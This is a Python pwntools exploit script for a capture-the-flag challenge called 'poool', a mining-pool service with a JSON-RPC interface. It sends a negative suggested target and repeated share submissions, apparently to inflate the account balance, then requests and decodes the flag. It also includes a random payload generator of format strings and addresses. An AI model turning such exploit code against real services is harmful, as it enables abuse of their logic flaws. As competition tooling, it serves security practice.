#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import time, random, string
from random import randint, choice
import json

context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])
LOCAL  = True
#LOCAL  = False
PROG    = "./poool"
#LIBC    = "./libc.so.6"
elf     = ELF(PROG)
#libc    = ELF(LIBC)

r = None

class random_str:
    nullable = True
    local = True
    junk = 'A'

    def __init__(self):
        while True:
            self.libc_base = randint(0x7f0000000, 0x7ffa00000) << 12
            if '\n' not in p64(self.libc_base):
                break
        while True:
            self.elf_base = randint(0x555555554, 0x568000000) << 12
            if '\n' not in p64(self.elf_base):
                break

    def _get_rand_address(self):
        while True:
            addresses = [0x400800, 0x601000, self.elf_base, self.libc_base]
            s = p64(choice(addresses) + randint(0, 0x10000))
            if '\n' not in s:
                return s

    def _get_rand_fmstr(self):
        types = ['%{}c', '%{}$hn', '%{}$n', '%*{}$c', '%{}$p']
        fmstr = choice(types).format(randint(6, 99))
        fmstr += choice(types).format(randint(6, 99))
        return fmstr

    def _get_rand_str(self, n):
        if self.nullable:
            charset = map(chr, range(0, 256))
        else:
            # you can change charset here
            # charset = map(chr, range(1, 9) + range(0xe, 0x20) + range(0x21, 0x100))    # no whitespace and null
            charset = map(chr, range(1, 10) + range(11, 0x100))    # no newline and null
        return ''.join([choice(charset) for _ in xrange(n)])

    def __mul__(self, n):
        if self.local:
            return junk * n

        if not self.nullable:
            return self._get_rand_str(n)

        if n < 8:
            return self._get_rand_str(n)

        fuck = ''
        while len(fuck) < n:
            t = randint(0, 20)
            if t == 0:
                fuck += self._get_rand_fmstr()
            elif 1 <= t <= 10:
                fuck += self._get_rand_str(8)
            else:
                fuck += self._get_rand_address()

        return fuck[:n]

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    #gdb.attach(r, gdbscript='symbol-file ./%s\nb *0x%x' % (PROG+'.dbg', addr))
    gdb.attach(r, gdbscript='b *0x%x' % (addr))

def newio(host, port):
    if LOCAL:
        r = process(PROG, raw=False)
    else:
        r = remote(host, port)
    return r

# exploit

def o_subscribe(ids, params):
    l = json.dumps({"id":ids, "method":"mining.subscribe", "params":params})
    r.sendline(l)
    res = json.loads(r.recvuntil("}"))
    assert(not res["error"])
    return res["result"]

def o_authorize(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.authorize", "params":params}))
    res = json.loads(r.recvuntil("}"))
    assert(not res["error"])
    dif = json.loads(r.recvuntil("}"))
    notify = json.loads(r.recvuntil("}"))
    return notify["params"]

def o_ping(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.ping", "params":params}))
    return r.recvuntil("}")

def o_submit(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.submit", "params":params}))
    return r.recvuntil("}")

def o_suggest_target(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"mining.suggest_target", "params":params}))
    res = json.loads(r.recvuntil("}"))
    assert(not res["error"])
    dif = json.loads(r.recvuntil("}"))
    notify = json.loads(r.recvuntil("}"))
    return notify["params"]
    
def o_speed(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.stats.speed", "params":params}))
    return r.recvuntil("}")

def o_share(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.stats.share", "params":params}))
    return r.recvuntil("}")

def o_balance(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.stats.balance", "params":params}))
    return r.recvuntil("}")

def o_flag(ids, params):
    r.sendline(json.dumps({"id":ids, "method":"client.exchange.flag", "params":params}))
    return json.loads(r.recvuntil("}"))["result"]

def exploit(host):
    global r
    port = 10001 # define port here
    rand = random_str()
    r = newio(host, port)
    res = o_subscribe(0, [])
    print res[1]
    res = o_authorize(0, ["oO0" + "A" * 32, "B" * 32])
    job = res[0]
    print o_share(0, [])
    #print o_speed(0, [])
    #print o_balance(0, [])
    for i in range(10):
        res = o_suggest_target(0, ["-1"])
        job = res[0]
        print o_submit(0, ["a", int(job, 16), rand._get_rand_str(4).encode("hex"), rand._get_rand_str(4).encode("hex")])
        pause()
    print o_share(0, [])
    print o_balance(0, [])
    # Not sure why it needs to wait in order for balance to be updated
    time.sleep(15)
    print o_share(0, [])
    print o_balance(0, [])
    #gdb.attach(r)
    res = o_flag(0, range(8 * 49))
    res = [format(int(res[i:i+4][::-1], 2), "x") for i in range(0, len(res), 4)]
    res = "".join(["".join(res[i:i+2][::-1]) for i in range(0, len(res), 2)])
    flag = res.upper()
    return flag

if __name__ == '__main__':
    # local test code here
    host = '10.13.37.24'
    flag = exploit(host)
    print flag
